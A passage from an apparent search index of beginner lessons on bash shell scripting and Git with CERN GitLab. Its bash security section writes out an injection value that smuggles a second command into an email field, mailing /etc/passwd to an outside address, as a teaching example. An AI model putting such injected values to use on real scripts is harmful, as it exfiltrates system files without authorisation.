“Test” using\nktmux Test\n\n"},"shell/shell2.html":{"url":"shell/shell2.html","title":"Advanced shell topics","keywords":"","body":"More about the UNIX shell\nTypes of shell\nSeveral shells are available, the most common ones being probably bash and tcsh.\nIn this tutorial, we will always refer to the bash shell, but keep in mind that other shells exist, which may sometimes have different syntax and behaviour!\nTo check the type of shell we are using we can type echo to display the value of the $0 environment variable:\necho $0\nwhich, if the shell in use is bash, returns\n-bash\nManual pages\nEach command has a manual page where you can find more information on how to use it. The manual pages can be accessed through the man command, for example:\nman ls\n\nBut what if we are looking for a command, but don’t know or don’t remember its name?\nIn this case it might be useful to use the apropos command.\nFor example, if we want to list the contents of a directory, we could look for something like\napropos “list directory”\nwhich will return a list of (possibly) relevant commands, together with their descriptions.\nIn this particular case:\ndir                  (1)  - list directory contents\ngfal-ls              (1)  - list directory contents or file information\nls                   (1)  - list directory contents\nls                   (1p)  - list directory contents\nvdir                 (1)  - list directory contents\nEnvironment variables\nIn addition to 0, some other common examples of environment variables are EDITOR, PATH, and LD_LIBRARY_PATH, whose value can be displayed by\necho $EDITOR\necho $PATH\necho $LD_LIBRARY_PATH\nIn particular, the PATH variable specifies in which directories programs can be found (for example, if we type ls, the command ls is searched for in such directories), while the LD_LIBRARY_PATH variable specifies where shared libraries are located.\nEnvironment variables can be exported with\nexport VARNAME=value\nThis can be done from the command line or from within a bash script.\nFor example, let's create a bash script named StarWars.sh, having the following lines:\n#!/bin/bash\necho “Hello Star Wars' world!”\nexport CHARACTER=“Anakin”\nAfter saving and closing, we can run it from the shell with\nbash StarWars.sh\nor with\n./StarWars.sh\nthe latter after changing the file permissions with chmod u+x StarWars.sh, so that the script can actually be executed.\nThe file permissions tell us who is allowed to do what to a given file or directory.\nThere are three basic permission types (read, write, and execute) and three sets of people to be given permissions (owner, users in the group, and users not in the group, where the group is defined for each file or directory and the group membership is configurable).\nThe owner and the group can be managed by the chown and chgrp commands.\nWhat happens if we now write echo $CHARACTER in the terminal? Can you explain why?\nLet's now try the following: {.callout}\nsource StarWars.sh\nor, equivalently:\n. StarWars.sh\nand then\n./StarWars.sh\necho $CHARACTER\nIs there any difference?\nExercise (5 min): Change the file permissions so that your friends can read, write, and execute (or not) the StarWars.sh shell script and try to set their Star Wars character to something you like.\nVariables\nIn bash, variables are usually interpreted as strings.\nHowever, we can do integer arithmetic using the let keyword. Let's add to StarWars.sh the following lines:\nA=1\nB=2\nstrvar=$A+$B\nlet intvar=$A+$B\necho \"strvar is ${strvar}, intvar is ${intvar}\"\nWhat can you notice?\nDifferences among files\nThe diff command is used to compare files line by line.\nTo simply check for differing files:\ndiff -q file1.dat file2.dat\nTo show the output in two columns and suppress the common lines:\ndiff -y —suppress-common-lines file1.dat file2.dat\nTo show the unified diff:\ndiff -u file1.dat file2.dat\nLooping over files\nIn bash, loops have the following syntax:\nfor VARIABLE in LIST\ndo\n  \ndone\nif the loop has to be repeated a fixed number of times, or:\nwhile [ EXPRESSION ]\ndo\n  \ndone\nif the loop has to be repeated until a condition is fulfilled.\nConditionals\nConditionals have the following syntax:\nif [ COND1 ]\nthen\n    echo “COND1 evaluated to true”\nelif [COND2 ]\nthen\n    echo “COND2 evaluated to true”\nelse\n    echo “Test not passed”\nfi\nExercise (5 min): Create a text file and then write a script that checks whether the text file\n\nexists;\nis readable;\nis newer than another text file.\n\nExercise (5 min): In the StarWars.sh script, add some lines to check whether\n\nA is equal to B;\nA is smaller than B;\nA is larger than B.\nBe careful! We might be tempted to use > and  inside the shell script, but they actually havea a different meaning for the shell, so lt and gt should be used instead.\n\nLinking commands\nLet us consider the three following lines, in which we link the commands to list the files in the Poems and Recipes folders through the ;, &&, or || operators:\nls Poems/*.txt; ls Recipes/*.txt\nls Poems/*.txt && ls Recipes/*.txt\nls Poems/*.txt || ls Recipes/*.txt\nThe ; means execute the first, then the second; the && means execute the first, then the second if the first was successful, while the || means execute the first, then the second if the first was not successful.\nPipes and redirection\nWe already saw how to chain commands together, for example using the pipe to redirect the output of a command to a file or to feed it to another command.\nExercise (5 min): Save in a file the lines containing the word “force” searching for them in all the files in the Material/StarWars folder.\nSolution:\nfiles=`ls StarWars/*.txt`\nfor file in $files; do grep —color -w “force” $file >> Sentences.dat; done\nExercise (5 min): Now do the same, but searching for a string provided by the user.\nSolution:\nThere are two ways to supply inputs to a shell script.\nOpen StarWars.sh and add the following lines\nfiles=`ls StarWars/*.txt`\necho “Enter the string to be looked for…”\nread string\necho “Looking for: ${string}”\nfor file in $files; do grep —color -w $string $file >> Sentences2.dat; done\nAnother solution is to replace the lines above with\nfiles=`ls StarWars/*.txt`\nstring=$1\necho “Looking for: ${string}”\nfor file in $files; do grep —color -w $string $file >> Sentences2.dat; done\nwhere command line arguments are used, and run again with\n. StarWars.sh\nand\n. StarWars.sh force\nIt must be noticed that the first argument is saved in the $1 variable. What is, then, $0? This is the name of the shell script! And what is $#? This is the number of parameters!\nWhat happens if we do not provide any argument?\nWe need to check that the string has been assigned, which can be done by adding\nif [ -n “${string}” ]\nthen\n    for file in $files; do grep —color -w $string $file >> Sentences.dat; done\nelse\n    echo “No string provided.”\n    return\nfi\nWhat happens if we use exit instead of return?\nAnother useful command worth mentioning is tee, which allows to save the output into a file, but also to show it on the stdout (our screen):\nls Poems/*.txt | tee ListOfFilesWithTee.dat\nIf we want to append to the output file, we can use the -a option:\nls Poems/*.txt | tee -a ListOfFilesWithTee.dat\nBash security\nSituations that can turn very wrong very quickly, which means it is important to be aware of potentially dangerous behaviours.\nIt is a good practice to not trust input data, which is one of the most common reasons of security-related incidents.\nSome examples are buffer overflow (that is, accepting input longer than the size of the allocated memory), invalid or malicious input, code inside data, and many others.\nOne practical example, provided by Sebastian Lopienski, is the following: let's say we wrote a script that sends emails using the mail command:\ncat confirmation.txt | mail $email\nand someone provides the following email address:\nme@fake.com; cat /etc/passwd | mail me@real.com\nSo, what do we get?\ncat confirmation.txt | mail me@fake.com;\ncat /etc/passwd | mail me@real.com\nGreat!\nComplexity\nBash is great until a certain level of complexity is reached…so try to keep it simple!\nWhat about this?\nText viewers\nThe less command, which is the improved version of an earlier program, called more, is used to read but not edit text files.\nIt allows to scroll both forwards and backwards through the text file, as well as to perform a basic search.\nUp and down arrows (or j and k) allow to scroll through the text file, line by line, while Ctrl+f and Ctrl+b allow to scroll through the text file, page by page.\nTo go to a specific line, it is possible to type the number of the line and then press G.\nTo search for a string forward, press / and then type the string.\nTo search for a string backward, press ? and then type the string.\nTo quit, press q.\nThe cat command is even simpler than less, since it just outputs the contents of one or more files to the standard output.\ncat file.dat\ncat file1.dat file2.dat\nBut it is very powerful when linking commands!\nFinally, the head/tail commands print the first(last) n lines of a given file:\nhead -n 2 file.dat\nhead -n 2 file1.dat file2.dat\nText editors\nText editors allow not only to read, but also to modify the contents of a text file.\nThere are text editors available for every taste, and this is for sure a not-exhaustive list of those you may find along your way:\n\nvim or simply vi\nemacs\nnano\ngedit\n\nDisk space\nAt some point we all need to check how much space we are using.\nFor doing that, we can use the df and du commands.\nThe df command displays the disk usage and remaining free space on all currently mounted devices:\ndf\nWe can specify the option -h to convert to human readable units (kB, MB, GB, …):\ndf -h\nand a directory, if we want to inspect only that:\ndf -h directory\nThe du command is similar to df, but goes recursively in all subdirectories of the present working directory:\ndu\nIf the option -s is specified,\ndu -s\nit checks the present working directory only. As for df, the -h option allows to have human readable units.\nAnother interesting option is\ndu —max-depth=N\nwhich allows to go N directories deep.\nOver the Wire and Bandit wargame\nAnd to conclude...let's start a 20 min wargame on Over the Wire and compete to earn a delicious cold beer to be served soon after the session itself!\nBandit is a wargame aimed at absolute beginners.\nIt is organised in levels, each level requiring to having completed the previous one. Don’t panic if you have no clue how to proceed:\n- try using the manual, by typing man  (even man has a man) and then type q to quit the manual pages;\n- for shell built-in commands, try with help ;\n- ask Google or your favourite search engine!\n"},"git/":{"url":"git/","title":"Version control with Git","keywords":"","body":"Git\nAs stated on the project's official website git-scm.com,\nGit is a free and open source distributed version control system designed to\nhandle everything from small to very large projects with speed and\nefficiency.\nGreat so this means that here we have a tool that we can use free of charge\n(even better, we can look at and modify the source code) which allows us to\nversion our projects.

Some word\nprocessors let us deal with this a little better, such as Microsoft\nWord's Track Changes, Google Docs' version\nhistory, or LibreOffice's Recording and Displaying Changes.\nVersion control systems start with a base version of the document and\nthen save just the changes you made at each step of the way. You can\nthink of it as a tape: if you rewind the tape and start at the base\ndocument, then you can play back each change and end up with your\nlatest version.\n\nOnce you think of changes as separate from the document itself, you\ncan then think about \"playing back\" different sets of changes onto the\nbase document and getting different versions of the document. For\nexample, two users can make independent sets of changes based on the\nsame document.\n\nUnless there are conflicts, you can even play two sets of changes onto the same base document.\n\nA version control system is a tool that keeps track of these changes for us and\nhelps us version and merge our files. It allows you to\ndecide which changes make up the next version, called a\ncommit, and keeps useful metadata about them. The\ncomplete history of commits for a particular project and their metadata make up\na repository. Repositories can be kept in sync\nacross different computers facilitating collaboration among different people.\n The Long History of Version Control SystemsAutomated version control systems are nothing new.\nTools like RCS, CVS, or Subversion have been around since the early 1980s and are used by many large companies.\nHowever, many of these are now becoming considered as legacy systems due to various limitations in their capabilities.\nIn particular, the more modern systems, such as Git and Mercurial\nare distributed, meaning that they do not need a centralized server to host the repository.\nThese modern systems also include powerful merging tools that make it possible for multiple authors to work within\nthe same files concurrently.\n\n Paper Writing\nImagine you drafted an excellent paragraph for a paper you are writing, but later ruin it. How would you retrieve\nthe excellent version of your conclusion? Is it even possible?\n\nImagine you have 5 co-authors. How would you manage the changes and comments they make to your paper?\nIf you use LibreOffice Writer or Microsoft Word, what happens if you accept changes made using the\nTrack Changes option? Do you have a history of those changes?\n\n\n\n Key Points\nVersion control is like an unlimited 'undo'.\nVersion control also allows many people to work in parallel.\n\n\nCC BY 4.0 - Based on git-novice © 2016–2017 Software Carpentry Foundation\n"},"git/02-setup.html":{"url":"git/02-setup.html","title":"Setting Up Git","keywords":"","body":"Setting Up Git\n Learning Objectives\nConfigure git the first time it is used on a computer.\nUnderstand the meaning of the --global configuration flag.\n\n\nWhen we use Git on a new computer for the first time,\nwe need to configure a few things.

The new changes are not staged because we have not added the file.\n$ git commit -m \"Comment on Venus as an unsuitable base\"\n\nThe changes that were staged (Venus is beautiful and full of love) have been committed. The changes that were not staged (Venus is too hot to be suitable as a base) have not. Our local working copy is different than the copy in our local repository.\n$ git checkout HEAD venus.txt\n\nWith checkout we discard the changes in the working directory so that our local copy is exactly the same as our HEAD, the most recent commit.\n$ cat venus.txt #this will print the contents of venus.txt to the screen\n\nIf we print venus.txt we will get answer 2.\n\n Checking Understanding of `git diff`Consider this command: git diff HEAD~3 mars.txt. What do you predict this command\nwill do if you execute it? What happens when you do execute it? Why?\nTry another command, git diff [ID] mars.txt, where [ID] is replaced with\nthe unique identifier for your most recent commit. What do you think will happen,\nand what does happen?\n\n Getting Rid of Staged Changesgit checkout can be used to restore a previous commit when unstaged changes have\nbeen made, but will it also work for changes that have been staged but not committed?\nMake a change to mars.txt, add that change, and use git checkout to see if\nyou can remove your change.\n\n Explore and Summarize HistoriesExploring history is an important part of git, often it is a challenge to find\nthe right commit ID, especially if the commit is from several months ago.\nImagine the planets project has more than 50 files.\nYou would like to find a commit with specific text in mars.txt is modified.\nWhen you type git log, a very long list appeared,\nHow can you narrow down the search?\nRecorded that the git diff command allow us to explore one specific file,\ne.g. git diff mars.txt. We can apply the similar idea here.\n$ git log mars.txt\n\nUnfortunately some of these commit messages are very ambiguous e.g. update files.\nHow can you search through these files?\nBoth git diff and git log are very useful and they summarize different part of the history for you.\nIs that possible to combine both? Let's try the following:\n$ git log --patch mars.txt\n\nYou should get a long list of output, and you should be able to see both commit messages and the difference between each commit.\nQuestion: What does the following command do?\n$ git log --patch HEAD~3 *.txt\n\n\n Key Points\ngit diff displays differences between commits.\ngit checkout recovers old versions of files.\n\n\nCC BY 4.0 - Based on git-novice © 2016–2017 Software Carpentry Foundation\n"},"git/06-ignore.html":{"url":"git/06-ignore.html","title":"Ignoring Things","keywords":"","body":"Ignoring Things\n Learning Objectives\nConfigure Git to ignore specific files.\nExplain why ignoring files can be useful.\n\n\nWhat if we have files that we do not want Git to track for us,\nlike backup files created by our editor\nor intermediate files created during data analysis.\nLet's create a few dummy files:\n$ mkdir results\n$ touch a.dat b.dat c.dat results/a.out results/b.out\n\nand see what Git says:\n$ git status\n\nOn branch master\nUntracked files:\n  (use \"git add ...\" to include in what will be committed)\n\n    a.dat\n    b.dat\n    c.dat\n    results/\nnothing added to commit but untracked files present (use \"git add\" to track)\nPutting these files under version control would be a waste of disk space.\nWhat's worse,\nhaving them all listed could distract us from changes that actually matter,\nso let's tell Git to ignore them.\nWe do this by creating a file in the root directory of our project called .gitignore:\n$ nano .gitignore\n$ cat .gitignore\n\n*.dat\nresults/\nThese patterns tell Git to ignore any file whose name ends in .dat\nand everything in the results directory.\n(If any of these files were already being tracked,\nGit would continue to track them.)\nOnce we have created this file,\nthe output of git status is much cleaner:\n$ git status\n\nOn branch master\nUntracked files:\n  (use \"git add ...\" to include in what will be committed)\n\n    .gitignore\nnothing added to commit but untracked files present (use \"git add\" to track)\nThe only thing Git notices now is the newly-created .gitignore file.\nYou might think we wouldn't want to track it,\nbut everyone we're sharing our repository with will probably want to ignore\nthe same things that we're ignoring.\nLet's add and commit .gitignore:\n$ git add .gitignore\n$ git commit -m \"Add the ignore file\"\n$ git status\n\n# On branch master\nnothing to commit, working directory clean\nAs a bonus, using .gitignore helps us avoid accidentally adding to the\nrepository files that we don't want to track:\n$ git add a.dat\n\nThe following paths are ignored by one of your .gitignore files:\na.dat\nUse -f if you really want to add them.\nIf we really want to override our ignore settings,\nwe can use git add -f to force Git to add something.

If you only want to ignore the contents of\nresults/plots, you can change your .gitignore to ignore\nonly the /plots/ subfolder by adding the following line to\nyour .gitignore:\nresults/plots/\nIf, instead, you want to ignore everything in /results/, but wanted to track\nresults/data, then you can add results/ to your .gitignore\nand create an exception for the results/data/ folder.\nThe next challenge will cover this type of solution.\nSometimes the ** pattern comes in handy, too, which matches\nmultiple directory levels. E.g. **/results/plots/* would make git ignore\nthe results/plots directory in any root directory.\n\n Including Specific FilesHow would you ignore all .data files in your root directory except for\nfinal.data?\nHint: Find out what ! (the exclamation point operator) does\n SolutionClick to expandYou would add the following two lines to your .gitignore:\n*.data           # ignore all data files\n!final.data      # except final.data\nThe exclamation point operator will include a previously excluded entry.\n\n Ignoring all data Files in a DirectoryGiven a directory structure that looks like:\nresults/data/position/gps/a.data\nresults/data/position/gps/b.data\nresults/data/position/gps/c.data\nresults/data/position/gps/info.txt\nresults/plots\nWhat's the shortest .gitignore rule you could write to ignore all .data\nfiles in result/data/position/gps?

We already have most of the machinery we need to do this; the\nonly thing missing is to copy changes from one repository to another.\nSystems like Git allow us to move work between any two repositories.  In\npractice, though, it's easiest to use one copy as a central hub, and to keep it\non the web rather than on someone's laptop.  Most programmers use hosting\nservices like GitHub, BitBucket or\nGitLab to hold those master copies. All of these services\nare the same from the perspective of the git command line however each\nprovider's website offers slightly different features. In this lesson we will\nuse CERN's instance of GitLab. This is the similar to\nthe public GitLab instance except it is hosted by CERN and is integrated with\nvarious CERN services such as Single Sign On\nand JIRA.\nLet's start by sharing the changes we've made to our current project with the\nworld.  Log in to CERN GitLab, then click on the +\nicon in the top right and create a new project called planets:\n\nName your repository \"planets\" and then click \"Create project\":\n\nHere we can see one of the main reasons why you might want to use GitLab at CERN\ninstead of an external service: every CERN user can create a private\nrepository, meaning its access can be restricted to the persons you want.\nExternal services such as GitHub only allow you to create\npublic repositories unless you pay for it. Note\nthat private repositories are very useful when collaborating for a paper.\nAs soon as the repository is created, GitLab displays a page with a URL and some\ninformation on how to configure your local repository:\n\nThis is roughly equivalent to perform the following on CERN's servers:\n$ mkdir planets\n$ cd planets\n$ git init --bare\n\nOur local repository still contains our earlier work on mars.txt, but the\nremote repository on CERN GitLab doesn't contain any files yet:\n\nThe next step is to connect the two repositories.  We do this by making the\nGitLab repository a remote for the local repository.\nThe home page of the repository on GitLab includes the string we need to\nidentify it:\n\nClick on the 'SSH' link to change the protocol from\nKRB5 to SSH and then copy that URL from the browser, go into the local planets\nrepository, and run this command:\n$ git remote add origin ssh://git@gitlab.cern.ch:7999/vlad/planets.git\n\nMake sure to use the URL for your repository rather than Vlad's: the only\ndifference should be your username instead of vlad.\nWe can check that the command has worked by running git remote -v:\n$ git remote -v\n\norigin  ssh://git@gitlab.cern.ch:7999/vlad/planets.git (fetch)\norigin  ssh://git@gitlab.cern.ch:7999/vlad/planets.git (push)\nThe name origin is a local nickname for your remote repository. We could use\nsomething else if we wanted to, but origin is by far the most common choice.\nOnce the nickname origin is set up, this command will push the changes from\nour local repository to the repository on GitLab:\n$ git push origin master\n\nCounting objects: 9, done.\nDelta compression using up to 4 threads.\nCompressing objects: 100% (6/6), done.\nWriting objects: 100% (9/9), 821 bytes, done.\nTotal 9 (delta 2), reused 0 (delta 0)\nTo ssh://gitlab.cern.ch:7999/vlad/planets.git\n * [new branch]      master -> master\nBranch master set up to track remote branch master from origin.\nOur local and remote repositories are now in this state:\n\n The '-u' FlagYou may see a -u option used with git push in some documentation.  This\noption is synonymous with the --set-upstream-to option for the git branch\ncommand, and is used to associate the current branch with a remote branch so\nthat the git pull command can be used without any arguments. To do this,\nsimply use git push -u origin master once the remote has been set up.\n\nWe can pull changes from the remote repository to the local one as well:\n$ git pull origin master\n\nFrom https://gitlab.cern.ch/vlad/planets\n * branch            master     -> FETCH_HEAD\nAlready up-to-date.\nPulling has no effect in this case because the two repositories are already\nsynchronized.  If someone else had pushed some changes to the repository on\nGitLab, though, this command would download them to our local repository.\n GitLab GUIBrowse to your planets repository on GitLab.\nUnder the \"Project\" tab, find and click on the text that says \"XX commits\"\n(where \"XX\" is some number).\nHover over, and click on, the three buttons to the right of each commit.\nWhat information can you gather/explore from these buttons?\nHow would you get that same information in the shell?\n SolutionClick to expandThe button with the picture of a clipboard copies the full\nidentifier of the commit to the clipboard. In the shell, git log will show\nyou the full commit identifier for each commit.\nWhen you click on the commit message, you'll see all of the changes that were\nmade in that particular commit. Green shaded lines indicate additions and red\nones removals. In the shell we can do the same thing with git diff. In\nparticular, git diff ID1..ID2 where ID1 and ID2 are commit identifiers\n(e.g. git diff a3bf1e5..041e637) will show the differences between those\ntwo commits.\nThe right-most button (\"Browse files\") lets you view all of the files in the repository at the\ntime of that commit. To do this in the shell, we'd need to checkout the\nrepository at that particular time. We can do this with git checkout ID\nwhere ID is the identifier of the commit we want to look at. If we do this, we\nneed to remember to put the repository back to the right state afterwards!\n\n GitLab TimestampCreate a remote repository on GitLab.  Push the contents of your local\nrepository to the remote.  Make changes to your local repository and push\nthese changes.  Go to the repo you just created on GitLab and check the\ntimestamps of the files.  How does\nGitLab record times, and why?\n SolutionClick to expandGitLab displays timestamps in a human readable relative format (i.e.\n\"22 hours ago\" or \"three weeks ago\"). However, if you hover over the timestamp,\nyou can see the exact time at which the last change to the file occurred.\n\n Push vs. CommitIn this lesson, we introduced the \"git push\" command.\nHow is \"git push\" different from \"git commit\"?\n SolutionClick to expandWhen we push changes, we're interacting with a remote repository to update it\nwith the changes we've made locally (often this corresponds to sharing the\nchanges we've made with others). Commit only updates your local repository.\n\n Fixing Remote SettingsIt happens quite often in practice that you made a typo in the\nremote URL. This exercise is about how to fix this kind of issues.\nFirst start by adding a remote with an invalid URL:\ngit remote add broken https://gitlab.cern.ch/this/url/is/invalid\nDo you get an error when adding the remote? Can you think of a\ncommand that would make it obvious that your remote URL was not\nvalid? Can you figure out how to fix the URL (tip: use git remote\n-h)? Don't forget to clean up and remove this remote once you are\ndone with this exercise.\n SolutionClick to expandWe don't see any error message when we add the remote (adding the remote tells\ngit about it, but doesn't try to use it yet). As soon as we try to use\ngit push we'll see an error message. The command git remote set-url\nallows us to change the remote's URL to fix it.\n\n Key Points\nA local Git repository can be connected to one or more remote repositories.\nUse the SSH protocol to connect to remote repositories.\ngit push copies changes from a local repository to a remote repository.\ngit pull copies changes from a remote repository to a local repository.\n\n\nCC BY 4.0 - Based on git-novice © 2016–2017 Software Carpentry Foundation\n"},"git/08-share.html":{"url":"git/08-share.html","title":"Sharing a repository with others","keywords":"","body":"Sharing a repository with others\n Learning Objectives\nClone a remote repository.\nCollaborate pushing to a common repository.\n\n\nFor the next step, get into pairs.  One person will be the \"Owner\" and the other\nwill be the \"Collaborator\". The goal is that the Collaborator add changes into\nthe Owner's repository. We will switch roles at the end, so both persons will\nplay Owner and Collaborator.\n Practicing By YourselfIf you're working through this lesson on your own, you can carry on by opening\na second terminal window.\nThis window will represent your partner, working on another computer. You\nwon't need to give anyone access on GitLab, because both 'partners' are you.\n\nThe Owner needs to give the Collaborator access.  On GitLab, click the\n\"Members\" tab at the top, and enter your partner's username.\n\n Understanding GitLab permissionsGitLab permission levels might be complicated to understand. This\ntable might come in handy.\n\nNext, the Collaborator needs to download a copy of the Owner's repository to\nher machine. This is called \"cloning a repo\". To clone the Owner's repo into\nher Desktop folder, the Collaborator enters:\n$ git clone ssh://git@gitlab.cern.ch:7999/vlad/planets.git ~/Desktop/vlad-planets\n\nReplace vlad with the Owner's username.\n\nThe Collaborator can now make a change in her clone of the Owner's repository,\nexactly the same way as we've been doing before:\n$ cd ~/Desktop/vlad-planets\n$ nano pluto.txt\n$ cat pluto.txt\n\nIt is so a planet!\n$ git add pluto.txt\n$ git commit -m \"Add notes about Pluto\"\n\n 1 file changed, 1 insertion(+)\n create mode 100644 pluto.txt\nThen push the change to the Owner's repository on GitLab:\n$ git push origin master\n\nCounting objects: 4, done.\nDelta compression using up to 4 threads.\nCompressing objects: 100% (2/2), done.\nWriting objects: 100% (3/3), 306 bytes, done.\nTotal 3 (delta 0), reused 0 (delta 0)\nTo ssh://gitlab.cern.ch:7999/vlad/planets.git\n   9272da5..29aba7c  master -> master\nNote that we didn't have to create a remote called origin: Git uses this name\nby default when we clone a repository.  (This is why origin was a sensible\nchoice earlier when we were setting up remotes by hand.)\nTake a look to the Owner's repository on its GitLab website now (maybe you need\nto refresh your browser.) You should be able to see the new commit made by the\nCollaborator.\nTo download the Collaborator's changes from GitLab, the Owner now enters:\n$ git pull origin master\n\nremote: Counting objects: 4, done.\nremote: Compressing objects: 100% (2/2), done.\nremote: Total 3 (delta 0), reused 3 (delta 0)\nUnpacking objects: 100% (3/3), done.\nFrom ssh://gitlab.cern.ch:7999/vlad/planets.git\n * branch            master     -> FETCH_HEAD\nUpdating 9272da5..29aba7c\nFast-forward\n pluto.txt | 1 +\n 1 file changed, 1 insertion(+)\n create mode 100644 pluto.txt\nNow the three repositories (Owner's local, Collaborator's local, and Owner's on\nGitLab) are back in sync.\n A Basic Collaborative WorkflowIn practice, it is good to be sure that you have an updated version of the\nrepository you are collaborating on, so you should git pull before making\nour changes. The basic collaborative workflow would be:\n\nupdate your local repo with git pull origin master,\nmake your changes and stage them with git add,\ncommit your changes with git commit -m, and\nupload the changes to GitLab with git push origin master\n\nIt is better to make many commits with smaller changes rather than\nof one commit with massive changes: small commits are easier to\nread and review.\n\n Switch Roles and RepeatSwitch roles and repeat the whole process.\n\n Review ChangesThe Owner push commits to the repository without giving any information\nto the Collaborator. How can the Collaborator find out what has changed with\ncommand line? And on GitLab?\n SolutionClick to expandOn the command line, the Collaborator can use git fetch origin master\nto get the remote changes into the local repository, but without merging\nthem. Then by running git diff master origin/master the Collaborator\nwill see the changes output in the terminal.\nOn GitLab, the Collaborator can go to their own fork of the repository and\nlook right above the light blue latest commit bar for a gray bar saying\n\"This branch is 1 commit behind Our-Respository:master.\" On the far right of\nthat gray bar is a Compare icon and link. On the Compare page the\nCollaborator should change the base fork to their own repository, then click\nthe link in the paragraph above to \"compare across forks\", and finally\nchange the head fork to the main repository. This will show all the commits\nthat are different.\n\n Comment Changes in GitLabThe Collaborator has some questions about one line change made by the Owner and\nhas some suggestions to propose.\nWith GitLab, it is possible to comment the diff of a commit. Over the line of\ncode to comment, a blue comment icon appears to open a comment window.\nThe Collaborator posts its comments and suggestions using GitLab interface.\n\n Version History, Backup, and Version ControlSome backup software can keep a history of the versions of your files. They also\nallows you to recover specific versions.

We will also see how this approach turns\nout to be useful even when working on small projects with only three or four\ncontributors.\nThe most naive approach to Git collaboration is what we have previously\nseen:\n\nWe have a single remote repository\nThis repository has one or more owners who decide who can contribute\nContributors can push their changes directly on the repository\n\nGitHub has introduced the concept of Pull Requests,\nwhich has been subsequently adopted by its most famous clone,\nGitLab.\nWhat is a Pull (or Merge) Request\nPull Requests are a way to propose changes to a remote repository without\nhaving write permissions to it, and therefore without pushing to it directly.\nNote that GitLab (which we are going to use for the following examples) uses the\nterm \"Merge Requests\" but the concept stays the same.\nThe general idea behind Pull Requests is:\n\nI would like to collaborate to a repository by adding some code\nI push this code somewhere\nI submit this code for a review to the owners of the original project (this is\nwhere I open a Pull Request)\nOwners will decide whether to accept or reject my changes, and a Web-based\ninterface allows people to comment and discuss\n\n Why are they called Pull Requests?We have seen in a previous lesson that the act of\nincorporating remote changes into a repository is called \"pulling\" and it is\nachieved by variations of the command git pull.\nProjects using Pull Requests do not allow people to git push code to them.\nInstead, what you are doing is requesting them to pull your code instead,\ntherefore the name.\n\n Pull Requests are not a builtin Git featureThe concept of Pull Requests leverages certain features of Git, but it's not\npart of the git tool itself: it depends on the hosting platform you use.\n\nFork the original project repository\nThe first step when collaborating to a project is to create a fork\nof the remote repository. Let's see exactly what it means with an example.\nConnect to our example repository using a Web browser:\n\nhttps://gitlab.cern.ch/starter-kit-scratch/starter-kit-example\n\nand click on the \"Fork\" button:\n\nIf you have played already with GitLab groups you might have several fork\ndestinations, if so, just select your user:\n\nYour GitLab account will now contain a repository with the same name as the\noriginal, starter-kit-example.\nAt this point, CERN GitLab contains several copies of the same repositories:\nthe main one, and all the forks you have just created. Those copies are remote\nclones for now, as they are not on your laptop yet.\nThe main feature of your fork is that you (and by default you only) have write\npermissions to it. You cannot directly push to the original repository, but\nyou can write to your fork.\n Forks are independentWhen you create a fork, you make a snapshot of the original repository at a\ngiven moment in time. From that point on, the fork is independent from both the\noriginal repository and any forks made by other users.\n\nClone a remote project and its fork\nNow it is time to open your terminal and clone the remote project. As we have\nalready seen we can use the SSH URL for cloning the project:\n$ mkdir test_merge_requests/\n$ cd test_merge_requests/\n$ git clone ssh://git@gitlab.cern.ch:7999/starter-kit-scratch/starter-kit-example.git\n\nCloning into 'starter-kit-example'...\nremote: Counting objects: 3, done.\nremote: Compressing objects: 100% (2/2), done.\nremote: Total 3 (delta 0), reused 0 (delta 0)\nReceiving objects: 100% (3/3), done.\nNow putting into practice what we have already learnt let's add\nour fork as a remote, it will have the same URL as the main repository except\nstarter-kit-scratch is replaced with your CERN username:\ncd starter-kit-example/\ngit remote add YOUR_CERN_USERNAME ssh://git@gitlab.cern.ch:7999/YOUR_CERN_USERNAME/starter-kit-example.git\n\n What are my remotes now?\nHow many remotes do you have now in your repository?\nWhat are their names?\n\n SolutionClick to expandYou can verify what are your remotes by using the git remote command:\n$ git remote -v\n\ndberzano    ssh://git@gitlab.cern.ch:7999/dberzano/starter-kit-example.git (fetch)\ndberzano    ssh://git@gitlab.cern.ch:7999/dberzano/starter-kit-example.git (push)\norigin    ssh://git@gitlab.cern.ch:7999/starter-kit-scratch/starter-kit-example.git (fetch)\norigin    ssh://git@gitlab.cern.ch:7999/starter-kit-scratch/starter-kit-example.git (push)\nYou now have two remotes: the default one, corresponding to the upstream\nrepository, is called origin and you have added it when you have cloned the\nrepository. The second one is named after your CERN account and you have created\nit explicitly with git remote add.\n\nSync your local repository with remote changes\nYou are now ready to start working on your new feature on your laptop. First off\nsince you are using different remotes, make sure your local Git working\ndirectory is up-to-date with the upstream (i.e. the \"main\", or origin)\nrepository.\nIf you don't have any pending local change, you can do:\n$ git pull\n\nSince your current branch \"tracks\" by default the corresponding remote branch\non the main (origin) repository, the git pull command will by default do the\nright thing. This is equivalent of explicitly telling git to fetch changes\nfrom origin:\n$ git pull origin\n\n Syncing using the nuclear optionIn some cases you might end up with your working directory (and/or branch)\n\"messed up\" and the git pull command will not work seamlessly. If you are sure\nyou are not going to lose anything important, you can simply reset your current\nworking directory by ignoring any local modification and destroying it:\n$ git fetch --all  # make local git aware of what changed remotely\n$ git reset --hard origin/master  # lose any local modification\n$ git clean -fxd  # get rid of any extra files not under version control\n\nYou should be very careful about using the git reset and git clean\ncommands, but they are very useful when your working area got messed up somehow.\n\nImplement your new feature\nYou can now implement your new \"feature\" by adding a bunch of files with some\nrandom content to your local repository. As an exercise, you can try to add a\nfile named after your CERN username:\necho \"My name is Firstname Lastname\" > YOUR_CERN_USERNAME.txt\n\nReplace YOUR_CERN_USERNAME with your CERN username to avoid conflicts.\nYou can now commit the changes:\n$ git add --all -v\n$ git commit -m 'Add user info for YOUR_CERN_USERNAME'\n\n What have I done?\nWhat did you do with git add?\nWhat did you do with git commit?\nWhy is the commit message appropriate?\nWhere are my changes now?\n\n SolutionClick to expandgit add --all adds all untracked/modified files to the \"staging area\", that\nis: the area containing the files which will be part of the next commit. The\n-v (as in verbose) switch is useful to spot unwanted additions, as it\nprints out every added file.\ngit commit creates a commit, whose message is appropriate as it is shorter than\n50 characters and meaningful, in other words it's concise.\nYour commit is only on your laptop only and it is not yet available in your\nfork, or on the upstream repository.\n\nPush changes\nWithout further ado let's push:\n$ git push\n\nUnfortunately it does not work (your message might actually be different):\nCounting objects: 3, done.\nDelta compression using up to 8 threads.\nCompressing objects: 100% (2/2), done.\nWriting objects: 100% (3/3), 316 bytes | 316.00 KiB/s, done.\nTotal 3 (delta 0), reused 0 (delta 0)\nremote: GitLab: You are not allowed to push code to protected branches on this project.\nTo 